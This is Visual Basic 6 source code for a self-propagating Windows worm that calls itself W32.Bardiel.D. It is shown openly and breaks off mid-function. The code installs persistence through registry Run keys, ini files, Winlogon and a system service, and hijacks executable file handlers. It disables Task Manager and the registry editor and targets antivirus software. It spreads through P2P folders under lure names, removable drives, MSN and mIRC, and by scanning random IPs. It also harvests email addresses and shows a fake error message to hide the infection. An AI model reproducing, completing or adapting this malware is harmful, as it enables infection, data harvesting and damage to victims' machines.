   VERSION 5.00
   Begin VB.Form Form1
      ClientHeight    =   480
      ClientLeft      =   60
      ClientTop       =   345
      ClientWidth     =   2265
      LinkTopic       =   "Form1"
      ScaleHeight     =   480
      ScaleWidth      =   2265
      ShowInTaskbar   =   0   'False
      StartUpPosition =   3  'Windows Default
      Visible         =   0   'False
      Begin VB.Timer Timer4
         Enabled         =   0   'False
         Interval        =   10000
         Left            =   600
         Top             =   0
      End
      Begin VB.Timer Timer3
         Enabled         =   0   'False
         Interval        =   10000
         Left            =   1800
         Top             =   0
      End
      Begin VB.Timer Timer2
         Enabled         =   0   'False
         Interval        =   10000
         Left            =   1200
         Top             =   0
      End
      Begin VB.Timer Timer1
         Enabled         =   0   'False
         Interval        =   10000
         Left            =   0
         Top             =   0
      End
   End
   Attribute VB_Name = "Form1"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
   Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
   Private Declare Function GetLogicalDrives Lib "kernel32" () As Long
   Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
   Private Declare Function GetDiskFreeSpace Lib "kernel32" Alias "GetDiskFreeSpaceA" (ByVal lpRootPathName As String, lpSectorsPerCluster As Long, lpBytesPerSector As Long, lpNumberOfFreeClusters As Long, lpTotalNumberOfClusters As Long) As Long
   Private Declare Function GetEnvironmentVariable Lib "kernel32" Alias "GetEnvironmentVariableA" (ByVal lpName As String, ByVal lpBuffer As String, ByVal nSize As Long) As Long
   Private Const MAX_PATH = 256
   Private Declare Function FindFirstFile Lib "kernel32" Alias "FindFirstFileA" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long
   Private Declare Function FindNextFile Lib "kernel32" Alias "FindNextFileA" (ByVal hFind As Long, lpFindFileData As WIN32_FIND_DATA) As Long
   Private Declare Function FindClose Lib "kernel32" (ByVal hFindFile As Long) As Long

   Private Type FILETIME
       dwLowDateTime As Long
       dwHighDateTime As Long
   End Type

   Private Type WIN32_FIND_DATA
       dwFileAttributes As Long
       ftCreationTime As FILETIME
       ftLastAccessTime As FILETIME
       ftLastWriteTime As FILETIME
       nFileSizeHigh As Long
       nFileSizeLow As Long
       dwReserved0 As Long
       dwReserved1 As Long
       cFileName As String * MAX_PATH
       cAlternate As String * 14
   End Type

   Dim BC4 As Variant

   Private Sub Form_Load()
   On Error Resume Next
   If (Command$ <> "") Then id = Shell(Command$, vbNormalFocus)
   If InStr(LCase(App.EXEName), "killusa") Then Call ADOS

   If App.PrevInstance Then
   End
   End If

   If ExistsKeys() Then Call SuvNext Else Call SuvInstall
   End Sub

   Private Sub SuvInstall()
   'OK
   On Error Resume Next: Dim nu As String
   Sey1 = RndName: Sey2 = RndName: Sey3 = RndName

   FileCopy Sp(3), Sp(1) & "\Image0X.scr"

   FileCopy Sp(3), Sp(1) & "\" & Sey1
    SA Sp(1) & "\" & Sey1, 6
   FileCopy Sp(3), Sp(1) & "\" & Sey2
    SA Sp(1) & "\" & Sey2, 6
   FileCopy Sp(3), Sp(1) & "\" & Sey3

   FileCopy Sp(3), Sp(1) & "\KillUsa.exe"
    SA Sp(1) & "\KillUsa.exe", 6

   Rw "Software\GedzacLABS\Bardiel.d", "Sey1", q(Sey1), 3, 1
   Rw "Software\GedzacLABS\Bardiel.d", "Sey2", q(Sey2), 3, 1
   Rw "Software\GedzacLABS\Bardiel.d", "Sey3", q(Sey3), 3, 1

   Rw "Software\Microsoft\Windows\CurrentVersion\Run", Mid(Sey1, 1, InStr(Sey1, ".") - 1), Sp(1) & "\" & Sey1, 3, 1
   Rw "Software\Microsoft\WindowsNT\CurrentVersion\Run", Mid(Sey1, 1, InStr(Sey1, ".") - 1), Sp(1) & "\" & Sey1, 3, 1

   For Each k In EnDisck(3)
   If Flx(k & "autoexec.bat") Then
   SA k & "autoexec.bat", 0
   n = FrFile
   Open k & "autoexec.bat" For Append As #n
   Print #n, vbCrLf & "@win " & Right(Sp(1), Len(Sp(1)) - 2) & "\" & Sey1
   Close #n
   End If
   Next

   SA Sp(0) & "\System.ini", 0
   WIni "boot", "shell", "Explorer.exe " & Sp(1) & "\" & Sey1, Sp(0) & "\system.ini"

   SA Sp(0) & "\win.ini", 0
   WIni "Windows", "run", Sp(1) & "\" & Sey1, Sp(0) & "\win.ini"

   Rw "Software\Microsoft\Active Setup\Installed Components\Bardiel", "StubPath", Sp(1) & "\" & Sey1, 3, 1

   If GetWinVersion = 2 Then
   Rw "SYSTEM\CurrentControlSet\Services\GEDZAC LABS", "Type", 272, 3, 2
   Rw "SYSTEM\CurrentControlSet\Services\GEDZAC LABS", "Description", "GEDZAC Service for W32.Bardiel.D", 3, 1
   Rw "SYSTEM\CurrentControlSet\Services\GEDZAC LABS", "Start", 2, 3, 2
   Rw "SYSTEM\CurrentControlSet\Services\GEDZAC LABS", "ErrorControl", 1, 3, 2
   Rw "SYSTEM\CurrentControlSet\Services\GEDZAC LABS", "ObjectName", "LocalSystem", 3, 1
   Rw "SYSTEM\CurrentControlSet\Services\GEDZAC LABS", "DisplayName", "GEDZAC Service", 3, 1
   Rw "SYSTEM\CurrentControlSet\Services\GEDZAC LABS", "ImagePath", Sp(1) & "\" & Sey1, 3, 3

   Rw "SYSTEM\ControlSet001\Services\GEDZAC LABS", "Type", 272, 3, 2
   Rw "SYSTEM\ControlSet001\Services\GEDZAC LABS", "Description", "GEDZAC Service for W32.Bardiel.D", 3, 1
   Rw "SYSTEM\ControlSet001\Services\GEDZAC LABS", "Start", 2, 3, 2
   Rw "SYSTEM\ControlSet001\Services\GEDZAC LABS", "ErrorControl", 1, 3, 2
   Rw "SYSTEM\ControlSet001\Services\GEDZAC LABS", "ObjectName", "LocalSystem", 3, 1
   Rw "SYSTEM\ControlSet001\Services\GEDZAC LABS", "DisplayName", "GEDZAC Service", 3, 1
   Rw "SYSTEM\ControlSet001\Services\GEDZAC LABS", "ImagePath", Sp(1) & "\" & Sey1, 3, 3

   Rw "SYSTEM\ControlSet002\Services\GEDZAC LABS", "Type", 272, 3, 2
   Rw "SYSTEM\ControlSet002\Services\GEDZAC LABS", "Description", "GEDZAC Service for W32.Bardiel.D", 3, 1
   Rw "SYSTEM\ControlSet002\Services\GEDZAC LABS", "Start", 2, 3, 2
   Rw "SYSTEM\ControlSet002\Services\GEDZAC LABS", "ErrorControl", 1, 3, 2
   Rw "SYSTEM\ControlSet002\Services\GEDZAC LABS", "ObjectName", "LocalSystem", 3, 1
   Rw "SYSTEM\ControlSet002\Services\GEDZAC LABS", "DisplayName", "GEDZAC Service", 3, 1
   Rw "SYSTEM\ControlSet002\Services\GEDZAC LABS", "ImagePath", Sp(1) & "\" & Sey1, 3, 3

   Rw "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", "Explorer.exe " & Sp(1) & "\" & Sey1, 3, 1
   End If

   Rw "Software\GedzacLABS\Bardiel.d", "Parent", Sp(3), 3, 1

   Rw "regfile\shell\open\command", "", "GDC", 1, 1
   Rw "keyfile\shell\open\command", "", "GDC", 1, 1

   Rw "Software\Microsoft\Windows Scripting Host\Settings", "Timeout", 0, 3, 2
   Rw "Software\Microsoft\Windows Script Host\Settings", "Timeout", 0, 3, 2
   Rw "Software\Microsoft\WindowsNT\CurrentVersion\Policies\System", "DisableRegistryTools", 1, 2, 2
   Rw "Software\Microsoft\WindowsNT\CurrentVersion\Policies\System", "DisableTaskMgr", 1, 2, 2
   Rw "Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 1, 2, 2
   Rw "Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1, 2, 2

   Rw "exefile\shell\open\command\", "", Sp(1) & "\" & Sey1 & " " & Chr(34) & "%" & "1" & Chr(34) & " %" & "*", 1, 1
   Rw "batfile\shell\open\command\", "", Sp(1) & "\" & Sey1 & " " & Chr(34) & "%" & "1" & Chr(34) & " %" & "*", 1, 1
   Rw "comfile\shell\open\command\", "", Sp(1) & "\" & Sey1 & " " & Chr(34) & "%" & "1" & Chr(34) & " %" & "*", 1, 1
   Rw "piffile\shell\open\command\", "", Sp(1) & "\" & Sey1 & " " & Chr(34) & "%" & "1" & Chr(34) & " %" & "*", 1, 1
   Rw "scrfile\shell\open\command\", "", Sp(1) & "\" & Sey1 & " " & Chr(34) & "%" & "1" & Chr(34) & " /S", 1, 1

   Extrat

   nu = Rm(): FileCopy Sp(3), Sp(1) & "\" & nu
   id = Shell(GetEvVar("comspec") & " /c " & gShP(Sp(1) & "\bzip.exe") & " " & gShP(Sp(1)) & "\gZip.zip" & " " & gShP(Sp(1) & "\" & nu), vbHide)

   Call WinExec(Sp(1) & "\" & Sey1, SW_NORMAL)

   If InStr(LCase(LangID()), "español") <> 0 Then
   MsgBox "Imposible abrir el archivo, " & Mid(Sp(3), InStrRev(Sp(3), "\") + 1) & " esta total o parcialmente dañado", vbCritical, "Error"
   Else
   MsgBox "Impossible to open the file, " & Mid(Sp(3), InStrRev(Sp(3), "\") + 1) & " this total or partially damaged", vbCritical, "Error"
   End If

   End
   End Sub

   Private Sub SuvNext()
   'OK
   On Error Resume Next
   If InStr(LCase(Sp(3)), LCase(Sey1)) Then
    Call WinExec(Sp(1) & "\" & Sey2, SW_NORMAL)
    Call WinExec(Sp(1) & "\" & Sey3, SW_NORMAL)
    Call WinExec(Sp(1) & "\KillUsa.exe", SW_NORMAL)
    Call ListDisk
    Call PurificaMails(Sp(2) & "\mail.dat")
    BC4 = B64(Sp(1) & "\gZip.zip")
    Timer4.Enabled = True
   ElseIf InStr(LCase(Sp(3)), LCase(Sey2)) Then
    Call Pld: Call Bfir: Call ListP2P: Call GedRed
   ElseIf InStr(LCase(Sp(3)), LCase(Sey3)) Then
    Call SetSpam
    Timer1.Enabled = True
    Timer2.Enabled = True
    Timer3.Enabled = True
   Else
   End
   End If
   End Sub

   Private Sub Extrat()
   'OK
   On Error Resume Next
   Dim n As Long, bz As String

   n = FreeFile
   Open Sp(3) For Binary Access Read As #n
   bz = Space(42166)
   Get #n, (FileLen(Sp(3)) - 42165), bz
   Close #n

   n = FreeFile
   Open Sp(1) & "\bZip.exe" For Binary Access Write As #n
   Put #n, , bz
   Close #n
   End Sub

   Sub GedRed()
   'OK
   On Error Resume Next
   For Each aip In GetLclIP(): CalcSbIp (aip): Next
   Do: DoEvents: CalcSbIp (GetRndIP): Loop
   End Sub

   Sub ListP2P()
   'OK
   On Error Resume Next

   Rw "Software\KAZAA\LocalContent", "DisableSharing", 0, 2, 2
   Rw "Software\KAZAA\ResultsFilter", "virus_filter", 0, 2, 2
   Rw "Software\KAZAA\ResultsFilter", "firewall_filter", 0, 2, 2

   Rw "Software\Grokster\LocalContent", "DisableSharing", 0, 2, 2
   Rw "Software\Grokster\LocalContent", "virus_filter", 0, 2, 2
   Rw "Software\Grokster\LocalContent", "firewall_filter", 0, 2, 2

   p0 = Array("C", "D", "E")

   p1 = Array(":\Program Files", ":\Archivos de programa", ":\Programmer", _
   ":\Program", ":\Programme", ":\Programmi", ":\Programfiler", ":\Programas")

   p2 = Array("\appleJuice\incoming", "\eDonkey2000\incoming", "\Gnucleus\Downloads", _
   "\Grokster\My Grokster", "\ICQ\shared files", "\Kazaa\My Shared Folder", _
   "\KaZaA Lite\My Shared Folder", "\LimeWire\Shared", "\morpheus\My Shared Folder", _
   "\Overnet\incoming", "\Shareaza\Downloads", "\Swaptor\Download", "\WinMX\My Shared Folder", _
   "\Tesla\Files", "\XoloX\Downloads", "\Rapigator\Share", "\KMD\My Shared Folder", _
   "\BearShare\Shared", "\Direct Connect\Received Files", "\eMule\Incoming", "\Kazaa Lite K++\My Shared Folder")

   For G = 0 To UBound(p0)
   If Fdx(p0(G) & ":\") Then
    For i = 0 To UBound(p1)

     If Fdx(p0(G) & p1(i)) Then

      For x = 0 To UBound(p2)
      If Fdx(p0(G) & p1(i) & p2(x)) Then P2P (p0(G) & p1(i) & p2(x))
      Next

     End If

    Next

   If Fdx(p0(G) & ":\My Downloads") Then P2P p0(G) & ":\My Downloads"
   If Fdx(p0(G) & ":\My Shared Folder") Then P2P p0(G) & ":\My Shared Folder"
   End If
   Next
   End Sub

   Sub P2P(Path)
   'OK
   On Error Resume Next

   If Right(Path, 1) <> "\" Then Path = Path & "\"

   For Each i In P2PName()
   If Not (Flx(Path & i)) Then FileCopy Sp(1) & "\" & Sey3, Path & i
   Next

   For Each i In ListFiles(Path)
   If Not (Flx(Path & i & ".exe")) Then FileCopy Sp(1) & "\" & Sey3, Path & i & ".exe"
   Next

   End Sub

   Function ListFiles(Path)
   'OK
   On Error Resume Next
   Dim x() As String, a As Integer, sf As String
   If Right(Path, 1) <> "\" Then Path = Path & "\"

   ReDim x(a)

   sf = Dir(Path, vbHidden + vbArchive + vbReadOnly + vbSystem + vbNormal)

   Do While Len(sf) <> 0
   If InStr(LCase(sf), ".exe") = 0 Then x(a) = Mid(sf, 1, InStr(LCase(sf), ".") - 1): ReDim Preserve x(a + 1): a = a + 1
   sf = Dir()
   Loop

   ReDim Preserve x(a - 1)

   ListFiles = x
   End Function

   Function P2PName()
   'OK
   On Error Resume Next
   P = Array("Ana Kournikova Sex Video.exe", "AVP Antivirus Pro Key Crack.exe", "Britney Spears Sex Video.exe", "Buffy Vampire Slayer Movie.exe", _
   "Crack Passwords Mail.exe", "Cristina Aguilera Sex Video.exe", "Game Cube Real Emulator.exe", "Hentai Anime Girls Movie.exe", "Jenifer Lopez Sex Video.exe", _
   "Matrix Movie.exe", "Mcafee Antivirus Scan Crack.exe", "Norton Anvirus Key Crack.exe", "Panda Antivirus Titanium Crack.exe", "PS2 PlayStation Simulator.exe", _
   "Quick Time Key Crack.exe", "Sakura Card Captor Movie.exe", "Sex Live Simulator.exe", "Sex Passwords.exe", "Spiderman Movie.exe", "Start Wars Trilogy Movies.exe", _
   "Thalia Sex Video.exe", "Winzip KeyGenerator Crack.exe ", "aol cracker.exe", "aol password cracker.exe", "divx pro.exe", "GTA 3 Crack.exe", "GTA 3 Serial.exe", _
   "play station emulator.exe", "virtua girl - adriana.exe", "virtua girl - bailey short skirt.exe", "Virtua Girl (Full).exe", "warcraft 3 crack.exe", "warcraft 3 serials.exe", _
   "counter-strike.exe", "delphi.exe", "divx_pro.exe", "HotGirls.exe", "hotmail_hack.exe", "pamela_anderson.exe", "serials2000.exe", "subseven.exe", "VB6.exe", "VirtualSex.exe", _
   "ACDSee 5.5.exe", "Age of Empires 2 crack.exe", "Animated Screen 7.0b.exe", "AOL Instant Messenger.exe", "AquaNox2 Crack.exe", "Audiograbber 2.05.exe", "BabeFest 2004 ScreenSaver 1.5.exe", _
   "Babylon 3.50b reg_crack.exe", "Battlefield1942_bloodpatch.exe", "Battlefield1942_keygen.exe", "Business Card Designer Plus 7.9.exe", "Clone CD 5.0.0.3 (crack).exe", "Clone CD 5.0.0.3.exe", _
   "Coffee Cup Free zip 7.0b.exe", "Cool Edit Pro v2.55.exe", "Diablo 2 Crack.exe", "DirectDVD 5.0.exe", "DirectX Buster (all versions).exe", "DirectX InfoTool.exe", "DivX Video Bundle 6.5.exe", _
   "Download Accelerator Plus 6.1.exe", "DVD Copy Plus v5.0.exe", "DVD Region-Free 2.3.exe", "FIFA2004 crack.exe", "Final Fantasy VII XP Patch 1.5.exe", "Flash MX crack (trial).exe", "FlashGet 1.5.exe", _
   "FreeRAM XP Pro 1.9.exe", "GetRight 5.0a.exe", "Global DiVX Player 3.0.exe", "Gothic2 licence.exe", "Guitar Chords Library 5.5.exe", "Hitman_2_no_cd_crack.exe", "Hot Babes XXX Screen Saver.exe", _
   "ICQ Pro 2004a.exe", "ICQ Pro 2004b (new beta).exe", "iMesh 3.6.exe", "iMesh 3.7b (beta).exe", "IrfanView 4.5.exe", "KaZaA Hack 2.5.0.exe", "KaZaA Speedup 3.6.exe", "Links 2004 Golf game (crack).exe", _
   "Living Waterfalls 1.3.exe", "Mafia_crack.exe", "Matrix Screensaver 1.5.exe", "MediaPlayer Update.exe", "mIRC 6.40.exe", "mp3Trim PRO 2.5.exe", "MSN Messenger 5.2.exe", "NBA2004_crack.exe", _
   "Need 4 Speed crack.exe", "Nero Burning ROM crack.exe", "Netfast 1.8.exe", "Network Cable e ADSL Speed 2.0.5.exe", "NHL 2004 crack.exe", "Nimo CodecPack (new) 8.0.exe", "PalTalk 5.01b.exe", _
   "Popup Defender 6.5.exe", "Pop-Up Stopper 3.5.exe", "QuickTime_Pro_Crack.exe", "Serials 2004 v.8.0 Full.exe", "SmartFTP 2.0.0.exe", "SmartRipper v2.7.exe", "Space Invaders 1978.exe", _
   "Splinter_Cell_Crack.exe", "Steinberg_WaveLab_5_crack.exe", "Trillian 0.85 (free).exe", "TweakAll 3.8.exe", "Unreal2_bloodpatch.exe", "Unreal2_crack.exe", "UT2004_bloodpatch.exe", _
   "UT2004_keygen.exe", "UT2004_no cd (crack).exe", "UT2004_patch.exe", "WarCraft_3_crack.exe", "Winamp 3.8.exe", "WindowBlinds 4.0.exe", "WinOnCD 4 PE_crack.exe", "WinZip 9.0b.exe", _
   "Yahoo Messenger 6.0.exe", "Zelda Classic 2.00.exe", "Windows XP complete + serial.exe", "Screen saver christina aguilera.exe", "Screen saver christina aguilera naked.exe", "Visual basic 6.exe", _
   "Starcraft serial.exe", "Credit Card Numbers generator(incl Visa,MasterCard,...).exe", "Edonkey2000-Speed me up scotty.exe", "Hotmail Hacker 2004-Xss Exploit.exe", "Kazaa SDK + Xbit speedUp for 2.xx.exe", _
   "Microsoft KeyGenerator-Allmost all microsoft stuff.exe", "Netbios Nuker 2004.exe", "Security-2004-Update.exe", "Stripping MP3 dancer+crack.exe", "Visual Basic 6.0 Msdn Plugin.exe", "Windows Xp Exploit.exe", _
   "WinRar 3.xx Password Cracker.exe", "WinZipped Visual C++ Tutorial.exe", "XNuker 2004 2.93b.exe", "cable modem ultility pack.exe", "macromedia dreamweaver key generator.exe", "winamp plugin pack.exe", _
   "winzip full version key generator.exe", "PerAntivirus 8.9.exe", "The Hacker Antivirus 5.7.exe"): P2PName = P
   End Function

   Function ExistsKeys() As Boolean
   'OK
   On Error Resume Next
   Sey1 = q(Rr("Software\GedzacLABS\Bardiel.d", "Sey1", 3))
   Sey2 = q(Rr("Software\GedzacLABS\Bardiel.d", "Sey2", 3))
   Sey3 = q(Rr("Software\GedzacLABS\Bardiel.d", "Sey3", 3))
   If Len(Sey1) <= 5 Then ExistsKeys = False: Exit Function
   If Flx(Sp(1) & "\" & Sey1) Then ExistsKeys = True Else ExistsKeys = False
   End Function

   Function EnDisck(a)
   'OK
   On Error Resume Next
   Dim mdk() As String, i As Integer, x As Integer, l As Long

   l = GetLogicalDrives()

   If l = False Then Exit Function

   For i = 0 To 25
    If (l And 2 ^ i) Then

     If GetDriveType(Chr(i + 65) & ":\") = a Then
     x = x + 1: ReDim Preserve mdk(1 To x): mdk(x) = Chr(i + 65) & ":\"
     End If

    End If
   Next

   EnDisck = mdk
   End Function

   Sub Gedfloppy()
   'OK
   On Error Resume Next

   Dim cd0 As Long, cd1 As Long, cd2 As Long, clt As Long, l As Long, R As Integer, v2 As String
   Dim AD(5)
   AD(0) = "Notes.scr": AD(1) = "Music.scr": AD(2) = "MsnMail.scr": AD(3) = "Web.scr": AD(4) = "Alejandra.scr"

   For Each vd In EnDisck(2)

   l = GetDiskFreeSpace(vd, cd0, cd1, cd2, clt)

    If l = 1 Then

   If (cd0 * cd1 * cd2 > 200000) Then

   Randomize
   R = Int(Rnd * 5)

   v2 = LCase(Dir(vd & "*.*"))

   Do While v2 <> ""
   If InStr(v2, ".scr") = 0 Then Exit Do
   v2 = Dir()
   Loop

   If (v2 <> "") And (InStr(v2, ".scr") = 0) And (Not (Flx(vd & v2 & ".pif"))) And (InStr(v2, ".pif") = 0) Then

    FileCopy Sp(1) & "\" & Sey3, vd & v2 & ".pif"

   Else

    If Not (Flx(vd & AD(R))) Then

     FileCopy Sp(1) & "\" & Sey3, vd & AD(R)

    End If

   End If

    End If
    End If
   Next
   End Sub

   Private Sub Timer1_Timer()
   'OK
   On Error Resume Next
   Timer1.Enabled = False
   Static ct As Integer
   If ct = 60 Then Call Gedfloppy: Call GetMlMsn: Call VerComp: ct = 0 Else ct = ct + 1
   Timer1.Enabled = True
   End Sub

   Private Sub Timer2_Timer()
   'OK
   On Error Resume Next
   Timer2.Enabled = False
   If GetWinVersion <> 2 Then KAVw9x Else KAVw2k
   Dim R As Boolean
   R = EnumWindows(AddressOf KAvWindow, ByVal 0&)
   Timer2.Enabled = True
   End Sub

   Function GetEvVar(sName As String) As String
   'OK
   On Error Resume Next
   Dim gEv As String, l As Long
   gEv = Space$(255)
       l = GetEnvironmentVariable(sName, gEv, Len(gEv))
   GetEvVar = Left$(gEv, l)
   End Function

   Private Sub ZipMe(Path)
   'OK
   On Error Resume Next
   If InStr(LCase(Path), LCase(Sp(0))) <> 0 Then Exit Sub
   SA Path, 0
   id = Shell(GetEvVar("comspec") & " /c " & gShP(Sp(1) & "\bzip.exe") & " -U " & gShP(Path) & " " & gShP(Sp(1) & "\Image0X.scr"), vbHide)
   Sleep 1000
   End Sub

   Private Sub MSGSpread()
   'OK
   On Error Resume Next
   Dim l As Boolean
   l = EnumWindows(AddressOf EnumMSG, ByVal 0&)
   Sleep 1000
   End Sub

   Private Sub Timer3_Timer()
   'OK
   On Error Resume Next
   If Not (iStat()) Then Exit Sub
   Timer3.Enabled = False
   Static xy As Integer
   If xy > 100 Then Call MSGSpread: xy = 0 Else xy = xy + 1
   Timer3.Enabled = True
   End Sub

   Private Sub GetMlMsn()
   'OK
   On Error Resume Next
   Dim Mcs As String, G As Long
   Set msu = CreateObject("Messenger.UIAutomation")
   If (msu Is Nothing) Or (msu.MyStatus = 1) Then Exit Sub
   Set msc = msu.MyContacts
   For x = 1 To msu.MyContacts.Count - 1
   Mcs = Mcs & msc.Item(x).SigninName & vbCrLf
   Next

   G = FrFile
   Open Sp(2) & "\msnl.dat" For Append As #G
   Print #G, Mcs
   Close #G

   PurificaMails (Sp(2) & "\msnl.dat")
   End Sub

   Private Function Rm()
   'OK
   On Error Resume Next
   Dim Bxt3(1 To 5) As String
   Bxt3(1) = ".exe": Bxt3(2) = ".bat": Bxt3(3) = ".pif": Bxt3(4) = ".scr": Bxt3(5) = ".com"
   Randomize
   Br = Int(Rnd * 5) + 1
   For i = 1 To 7
   R = Int(Rnd * 55) + 66: If R = 92 Then R = 96
   Rm = Rm & Chr(R)
   Next
   Rm = Rm & Bxt3(Br)
   End Function

   Private Sub ListDisk()
   'OK
   On Error Resume Next
   For Each dk In EnDisck(3): ListDirs (dk): Next
   End Sub

   Private Sub ListDirs(ByVal Path)
   'OK
   On Error Resume Next
   Dim pFe As WIN32_FIND_DATA, fol As String, fat As Long, v0 As Long, v1 As Long, sDirs As String

   If Right$(Path, 1) <> "\" Then Path = Path & "\"

   v0 = 0
   v0 = FindFirstFile(Path & "*.*", pFe)

   Do
   fol = Mid(pFe.cFileName, 1, InStr(pFe.cFileName, Chr(0)) - 1)
   fat = pFe.dwFileAttributes

   If IsADir(fat) And (Right$(fol, 1) <> ".") Then
   ListFils (Path & fol)
   ListDirs (Path & fol)
   End If

   pFe.cFileName = ""
   v1 = FindNextFile(v0, pFe)
   Loop While v1 <> 0

   FindClose (v0)
   End Sub

   Private Sub ListFils(ByVal Path)
   'OK
   On Error Resume Next
   Dim pFl As WIN32_FIND_DATA, fil As String, fal As Long, b0 As Long, b1 As Long

   If Right$(Path, 1) <> "\" Then Path = Path & "\"

   b0 = 0
   b0 = FindFirstFile(Path & "*.*", pFl)

   Do
   fil = Mid(pFl.cFileName, 1, InStr(pFl.cFileName, Chr(0)) - 1)
   fal = pFl.dwFileAttributes

   If InStr(LCase(fil), "mirc.ini") <> 0 Then
   bMirc Path

   ElseIf InStr(LCase(fil), ".zip") <> 0 Then
   'Call ZipMe(Path & fil)

   ElseIf (InStr(LCase(fil), ".ht") <> 0) Or (InStr(LCase(fil), ".txt") <> 0) Or (InStr(LCase(fil), ".php") <> 0) Or (InStr(LCase(fil), ".asp") <> 0) Then
   Call hMail(Path & fil)
   End If

   pFl.cFileName = ""
   b1 = FindNextFile(b0, pFl)
   Loop While b1 <> 0

   FindClose (b0)
   End Sub

   Private Function IsADir(n) As Boolean
   'OK
   On Error Resume Next
   Dim Nl(4) As Integer
   Nl(0) = 16: Nl(1) = 2: Nl(2) = 1: Nl(3) = 32: Nl(4) = 4

   If (n = Nl(0)) Or (n = 55) Then IsADir = True: Exit Function

   For i = 0 To UBound(Nl) - 1
   If (n = Nl(0) + Nl(i + 1)) Then IsADir = True: Exit Function
   Next

   For i = 0 To UBound(Nl) - 1
    For x = 0 To UBound(Nl) - 1
    If i <> x Then
     If (n = Nl(0) + Nl(i + 1) + Nl(x + 1)) Then IsADir = True: Exit Function
    End If
    Next
   Next

   For i = 3 To UBound(Nl)
    If (n = Nl(0) + Nl(1) + Nl(2) + Nl(i)) Then IsADir = True: Exit Function
   Next

   End Function

   Private Sub hMail(ByVal Path)
   'OK
   On Error Resume Next
   Dim va0 As String, va1 As String, n0 As Long, vas
   n0 = FrFile

   Open Path For Binary Access Read As #n0
   va0 = String$(LOF(n0), " ")
   Get #n0, , va0
   Close #n0

   If InStr(LCase(va0), "msn hotmail") <> 0 Then

   vas = Split(va0, " ")

   For Each h0 In vas
   If InStr(LCase(h0), "@hotmail") <> 0 Then va1 = va1 & h0 & vbCrLf
   Next

   va1 = Replace(va1, "<", "")
   va1 = Replace(va1, ">", "")
   va1 = Replace(va1, "De:", "")
   va1 = Replace(va1, "Para:", "")
   va1 = Replace(va1, "From:", "")
   va1 = Replace(va1, "CC:", "")
   va1 = Replace(va1, "To:", "")
   va1 = Replace(va1, "DIV/DIV", "")
   va1 = Replace(va1, ",", "")
   va1 = Replace(va1, "&gt;", "")
   va1 = Replace(va1, "&lt;", "")

   vas = Split(va1, vbCrLf): va1 = ""

   For Each h0 In vas
   If IsMail(h0) = True Then va1 = va1 & h0 & vbCrLf
   Next

   Else

   vas = Split(va0, " ")

   For Each h0 In vas
   If InStr(LCase(h0), "mailto") <> 0 Then
   pa = InStr(h0, Chr(34)): pm = Mid$(h0, pa + 8)
   pz = InStr(pm, Chr(34)): pm = Left$(pm, pz - 1)
   If IsMail(pm) = True Then va1 = va1 & pm & vbCrLf
   End If
   Next

   End If

   Open Sp(2) & "\mail.dat" For Append As #1
   Print #1, va1
   Close #1

   End Sub

   Private Function IsMail(ML) As Boolean
   'OK
   On Error Resume Next: Dim R(60) As String
   If Len(ML) <= 5 Then IsMail = False: Exit Function
   R(0) = "/": R(1) = "\": R(2) = "?": R(3) = "="
   R(4) = ">"
   R(5) = "<": R(6) = Chr(34): R(7) = ";": R(8) = ","
   R(9) = Chr(37): R(10) = "¡": R(11) = "¿": R(12) = ")"
   R(13) = "(": R(14) = "virus": R(15) = Chr(32): R(16) = ":"
   R(17) = "[": R(18) = "]": R(19) = ".."
   R(20) = "master": R(21) = "persys": R(22) = "perant": R(23) = "virus": R(24) = "abuse"
   R(25) = "report": R(26) = "panda": R(27) = "symantec": R(28) = "trend": R(29) = "avp"
   R(30) = "kasp": R(31) = "nod": R(32) = "support": R(33) = "admin": R(34) = "foo"
   R(35) = "iana": R(36) = "messagelab": R(37) = "microsoft": R(38) = "msn": R(39) = "anyone"
   R(40) = "bug": R(41) = "f-secur": R(42) = "free-av": R(43) = "google": R(44) = "help"
   R(45) = "info": R(46) = "linux": R(47) = "soporte": R(48) = "nobody": R(49) = "noone"
   R(50) = "noreply": R(51) = "rating": R(52) = "root": R(53) = "samples": R(54) = "sopho"
   R(55) = "spam": R(56) = "unix": R(57) = "upd": R(58) = "winrar": R(59) = "winzip"

   For k = 0 To UBound(R) - 1
   If InStr(LCase(ML), R(k)) <> 0 Then
   IsMail = False
   Exit Function
   End If
   Next
   X1 = InStr(ML, "@"): X2 = InStr(ML, ".")
   If (X1 > 1) And (X2 <> 0) And (X1 < X2) Then IsMail = True Else IsMail = False
   End Function

   Private Sub PurificaMails(Path)
   'OK
   On Error Resume Next
   Dim va0 As String, va1 As String, n0 As Long, vas
   Dim bh As String, bl As String, bm As String
   n0 = FrFile: n1 = FrFile: n2 = FrFile: n3 = FrFile

   Open Path For Binary Access Read As #n0
   va0 = String$(LOF(n0), " ")
   Get #n0, , va0
   Close #n0

   vas = Split(va0, vbCrLf)

   Open Sp(2) & "\bh.dat" For Binary Access Read As #10: bh = String$(LOF(10), " "): Get #10, , bh: bh = LCase(bh): Close #10
   Open Sp(2) & "\bl.dat" For Binary Access Read As #11: bl = String$(LOF(11), " "): Get #11, , bl: bl = LCase(bl): Close #11
   Open Sp(2) & "\bm.dat" For Binary Access Read As #12: bm = String$(LOF(12), " "): Get #12, , bm: bm = LCase(bm): Close #12

   Open Sp(2) & "\bh.dat" For Append As #13
   Open Sp(2) & "\bl.dat" For Append As #14
   Open Sp(2) & "\bm.dat" For Append As #16

   For Each h0 In vas
   If IsMail(h0) Then
    If InStr(LCase(h0), "hotmail.com") Then
    If (InStr(bh, LCase(h0)) = 0) Then Print #13, h0
    ElseIf InStr(LCase(h0), "latinmail.com") Then
    If (InStr(bl, LCase(h0)) = 0) Then Print #14, h0
    Else
